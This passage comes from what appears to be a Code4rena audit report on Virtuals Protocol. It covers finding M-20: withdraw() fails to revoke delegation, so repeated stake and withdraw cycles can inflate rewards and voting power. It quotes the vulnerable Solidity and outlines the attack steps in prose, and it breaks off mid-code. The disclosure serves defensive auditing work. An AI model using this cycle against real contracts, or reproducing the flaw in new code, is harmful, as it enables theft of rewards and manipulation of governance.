width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-129\"\u003e[M-20] Delegation not revoked on withdrawal allows reward and voting power inflation post-maturity\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-456\"\u003eyaractf\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-148\"\u003eIshenxx\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-399\"\u003ennamdi0482\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L102\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L102\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L264\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L264\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-7\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-7\" aria-label=\"finding description and impact 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eStakers delegate their voting power using the \u003ccode\u003estake()\u003c/code\u003e function, which internally calls \u003ccode\u003e_delegate(receiver, delegatee)\u003c/code\u003e and records the delegatee via checkpointing at the current \u003ccode\u003eclock()\u003c/code\u003e (block number). Upon maturity (\u003ccode\u003ematureAt\u003c/code\u003e), the \u003ccode\u003ewithdraw()\u003c/code\u003e function allows full withdrawal of tokens, including by the stakers.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L80\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L80\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecanStake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Staking is disabled for private agent\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Either public or first staker\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Cannot stake 0\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient asset token balance\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eallowance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient asset token allowance\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estakingTokenToVirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisBlacklisted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Agent Blacklisted\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddValidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_mint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;      \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balanceCheckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSafeCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoUint208\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, the \u003ccode\u003ewithdraw()\u003c/code\u003e function does not call \u003ccode\u003e_delegate(sender, address(0))\u003c/code\u003e to clean up delegations when a user fully withdraws their stake. This leaves the previous delegation entry active, even though the staker now has zero voting power.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L95\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L95\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"104\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewithdraw\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient balance\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; ((\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematureAt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not mature yet\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_burn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balanceCheckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSafeCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoUint208\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOnce maturity is reached, a malicious user can exploit this flaw by:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe user stakes tokens and delegates.\u003c/li\u003e\n\u003cli\u003eThen immediately withdraws them when maturity.\u003c/li\u003e\n\u003cli\u003eRepeats the cycle multiple times, possibly in the same block.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEach cycle leaves delegation entries intact while reducing the actual staked balance to zero.\u003c/p\u003e\n\u003cp\u003eThe system uses \u003ccode\u003egetPastDelegates()\u003c/code\u003e in reward logic to compute historical rewards based on:\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L204\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L204\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetClaimableStakerRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        